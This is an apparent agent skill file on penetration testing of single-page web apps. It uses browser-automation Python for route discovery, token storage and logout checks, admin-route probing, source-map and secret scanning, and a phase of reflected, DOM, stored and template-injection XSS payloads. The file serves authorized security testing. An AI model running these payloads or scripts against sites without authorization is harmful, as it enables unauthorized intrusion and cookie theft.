---
name: pentest-spa
description: "SPA-specific penetration testing patterns for Vue, React, and Angular applications. Covers client-side security testing that curl cannot perform."
---

# SPA Penetration Testing Skill

Testing Single Page Applications (Vue, React, Angular) requires browser-based tools because curl only sees the initial HTML shell. This skill covers SPA-specific attack vectors and testing patterns.

## Key Principle

**SPAs render content client-side.** Traditional tools (curl, wget, nikto) only see the server response HTML â€” they miss:
- Dynamically rendered routes and content
- Client-side authentication flows
- DOM-based XSS vulnerabilities
- Client-side storage (localStorage, sessionStorage)
- JavaScript-extracted API endpoints and secrets

**Always use `shannon_browser` for SPA testing.**

## Phase 1: SPA Reconnaissance

### 1.1 Identify the Framework

```python
await page.goto('https://target')
framework = await page.evaluate('''() => {
    if (window.__NUXT__) return "Nuxt.js (Vue SSR)"
    if (document.querySelector("[ng-version]")) return "Angular"
    if (document.querySelector("[data-reactroot]") || document.querySelector("#__next")) return "React/Next.js"
    if (window.__VUE__) return "Vue.js"
    const scripts = Array.from(document.querySelectorAll("script[src]")).map(s => s.src)
    if (scripts.some(s => s.includes("vue"))) return "Vue.js"
    if (scripts.some(s => s.includes("react"))) return "React"
    if (scripts.some(s => s.includes("angular"))) return "Angular"
    return "Unknown SPA"
}''')
print(f"Framework: {framework}")
```

### 1.2 Extract All Routes from JavaScript Bundles

```python
await page.goto('https://target')
scripts = await page.evaluate('''() => {
    return Array.from(document.querySelectorAll("script[src]"))
        .map(s => s.src)
        .filter(s => s.includes("main") || s.includes("app") || s.includes("chunk") || s.includes("vendor"))
}''')
print("JS bundles found:")
for s in scripts:
    print(f"  {s}")
```

Then analyze each bundle with `shannon_js_analyze`:
```
shannon_js_analyze url="https://target/main.abc123.js"
```

### 1.3 Discover Client-Side Routes

**Vue Router:**
```python
await page.goto('https://target')
routes = await page.evaluate('''() => {
    if (window.__VUE__ && window.__VUE__.$router) {
        return window.__VUE__.$router.options.routes.map(r => ({path: r.path, name: r.name}))
    }
    return []
}''')
print(routes)
```

**React Router:**
```python
await page.goto('https://target')
await page.wait_for_timeout(2000)
links = await page.evaluate('''() => {
    return Array.from(document.querySelectorAll("a[href]"))
        .map(a => a.getAttribute("href"))
        .filter(h => h && h.startsWith("/"))
        .filter((v, i, a) => a.indexOf(v) === i)
}''')
print("Discovered routes:")
for link in links:
    print(f"  {link}")
```

**Angular Router:**
```python
await page.goto('https://target')
routes = await page.evaluate('''() => {
    const routerEl = document.querySelector("[ng-version]")
    const links = Array.from(document.querySelectorAll("[routerlink]"))
    return links.map(l => l.getAttribute("routerlink"))
}''')
print(routes)
```

## Phase 2: Authentication Testing

### 2.1 Login Flow Analysis

```python
await page.goto('https://target/#/login')
await page.wait_for_timeout(1000)

# Fill credentials and intercept the request
async with page.expect_request("**/api/**") as req_info:
    await page.fill('input[type="email"], input[name="email"], #email', 'test@test.com')
    await page.fill('input[type="password"], input[name="password"], #password', 'password123')
    await page.click('button[type="submit"], .login-button, #loginButton')

request = await req_info.value
print(f"Login URL: {request.url}")
print(f"Method: {request.method}")
print(f"Body: {request.post_data}")
```

### 2.2 Token Storage Analysis

```python
await page.goto('https://target')
# After successful login:
storage = await page.evaluate('''() => ({
    localStorage: Object.fromEntries(
        Object.keys(localStorage).map(k => [k, localStorage.getItem(k)?.substring(0, 100)])
    ),
    sessionStorage: Object.fromEntries(
        Object.keys(sessionStorage).map(k => [k, sessionStorage.getItem(k)?.substring(0, 100)])
    ),
    cookies: document.cookie
})''')
print("Token storage:")
print(f"  localStorage keys: {list(storage['localStorage'].keys())}")
print(f"  sessionStorage keys: {list(storage['sessionStorage'].keys())}")
print(f"  cookies: {storage['cookies'][:200]}")
```

**Security Check**: Tokens in localStorage are vulnerable to XSS. Prefer httpOnly cookies.

### 2.3 Post-Logout Token Persistence

```python
# After logging out:
await page.click('.logout-button, #logoutButton, a[href*="logout"]')
await page.wait_for_timeout(2000)
remaining = await page.evaluate('''() => ({
    token: localStorage.getItem("token"),
    access_token: localStorage.getItem("access_token"),
    session: sessionStorage.getItem("session"),
})''')
for key, val in remaining.items():
    if val:
        print(f"VULNERABLE: {key} still present after logout: {val[:50]}")
```

## Phase 3: XSS Testing

### 3.1 Reflected XSS via URL Parameters

```python
payloads = [
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<svg onload=alert(1)>',
]
for payload in payloads:
    test_url = f'https://target/#/search?q={payload}'
    await page.goto(test_url)
    await page.wait_for_timeout(1000)
    content = await page.content()
    if payload in content or 'onerror' in content:
        print(f"POTENTIALLY VULNERABLE: {payload}")
    else:
        print(f"Not reflected: {payload[:30]}")
```

### 3.2 DOM-based XSS via URL Hash

```python
# Test URL fragment injection (common in SPAs)
await page.goto('https://target/#/<img src=x onerror=alert(document.domain)>')
await page.wait_for_timeout(2000)
dom_check = await page.evaluate('''() => {
    const body = document.body.innerHTML
    return {
        has_img_tag: body.includes('onerror'),
        has_script: body.includes('<script'),
        inner_html_sinks: body.match(/innerHTML|outerHTML|document\\.write/) !== null,
    }
}''')
print(dom_check)
```

### 3.3 Stored XSS via Forms

```python
# Test comment/feedback forms
xss_payload = '<img src=x onerror=alert(document.cookie)>'
await page.goto('https://target/#/contact')
await page.fill('textarea, input[name="comment"], #comment', xss_payload)
await page.fill('input[name="rating"], #rating', '5')
await page.click('button[type="submit"], #submitButton')
await page.wait_for_timeout(2000)

# Now check if XSS renders anywhere
await page.goto('https://target/#/about')  # or wherever feedback appears
content = await page.content()
if 'onerror' in content:
    print("VULNERABLE: Stored XSS via feedback form")
```

### 3.4 Client-Side Template Injection

```python
# Angular: {{constructor.constructor('alert(1)')()}}
# Vue: {{_c.constructor('alert(1)')()}}
template_payloads = [
    '{{7*7}}',
    '${7*7}',
    '{{constructor.constructor("alert(1)")()}}',
]
for payload in template_payloads:
    await page.goto(f'https://target/#/search?q={payload}')
    await page.wait_for_timeout(1000)
    content = await page.content()
    if '49' in content:
        print(f"TEMPLATE INJECTION: {payload} evaluated to 49!")
```

## Phase 4: API Endpoint Testing

### 4.1 Intercept All API Calls

```python
api_calls = []
def handle_request(request):
    if '/api/' in request.url or '/rest/' in request.url:
        api_calls.append({
            'url': request.url,
            'method': request.method,
            'headers': dict(request.headers),
        })
page.on('request', handle_request)

# Navigate through the app
await page.goto('https://target')
await page.wait_for_timeout(3000)
# Click through menus
for link in await page.query_selector_all('a[href*="#/"]'):
    try:
        await link.click()
        await page.wait_for_timeout(1000)
    except:
        pass

page.remove_listener('request', handle_request)
print(f"Captured {len(api_calls)} API calls:")
for call in api_calls:
    print(f"  {call['method']} {call['url']}")
```

### 4.2 Test Admin Routes

```python
admin_routes = [
    '/#/administration',
    '/#/admin',
    '/#/accounting',
    '/#/dashboard',
    '/#/users',
    '/#/settings',
    '/#/config',
]
for route in admin_routes:
    await page.goto(f'https://target{route}')
    await page.wait_for_timeout(1000)
    status = await page.evaluate('() => document.title')
    content = await page.content()
    visible = len(content) > 500
    print(f"{route}: title='{status}', has_content={visible}")
    if visible:
        await page.screenshot(path=f'/workspace/admin-route-{route.replace("/", "_")}.png')
```

## Phase 5: Client-Side Security Checks

### 5.1 Source Map Exposure

```python
import requests
# Check if source maps are exposed
scripts = await page.evaluate('''() =>
    Array.from(document.querySelectorAll("script[src]")).map(s => s.src)
''')
for script_url in scripts:
    map_url = script_url + '.map'
    r = requests.head(map_url, verify=False, timeout=10)
    if r.status_code == 200:
        print(f"EXPOSED SOURCE MAP: {map_url}")
    else:
        print(f"Not exposed: {map_url}")
```

### 5.2 Debug Mode Detection

```python
debug_check = await page.evaluate('''() => ({
    vue_devtools: !!window.__VUE_DEVTOOLS_GLOBAL_HOOK__,
    react_devtools: !!window.__REACT_DEVTOOLS_GLOBAL_HOOK__,
    angular_debug: !!window.ng?.getComponent,
    debug_mode: !!window.DEBUG || !!window.debug,
    console_log_leak: document.body.innerHTML.includes("console.log"),
})''')
for check, result in debug_check.items():
    if result:
        print(f"FINDING: {check} = {result}")
```

### 5.3 Sensitive Data in JavaScript

```python
# Search page source for hardcoded secrets
content = await page.content()
import re
patterns = {
    'API Key': r'["\']api[_-]?key["\']\s*[:=]\s*["\']([^"\']+)',
    'Secret': r'["\']secret["\']\s*[:=]\s*["\']([^"\']+)',
    'Password': r'["\']password["\']\s*[:=]\s*["\']([^"\']+)',
    'Token': r'["\']token["\']\s*[:=]\s*["\']([^"\']+)',
}
for name, pattern in patterns.items():
    matches = re.findall(pattern, content, re.IGNORECASE)
    for m in matches:
        if len(m) > 5 and 'placeholder' not in m.lower():
            print(f"FINDING: {name} found in page source: {m[:50]}")
```

## Workflow Summary

1. **Identify framework** (Vue/React/Angular) using `shannon_browser`
2. **Extract JS bundles** and analyze with `shannon_js_analyze`
3. **Discover routes** (client-side router extraction)
4. **Test auth flow** (login, token storage, logout cleanup)
5. **XSS testing** (reflected, DOM-based, stored, template injection)
6. **Intercept API calls** by navigating through the app
7. **Test admin routes** for access control
8. **Check source maps** and debug mode exposure
9. **Correlate findings** with `shannon_correlate_findings`
10. **Generate report** with `shannon_report`
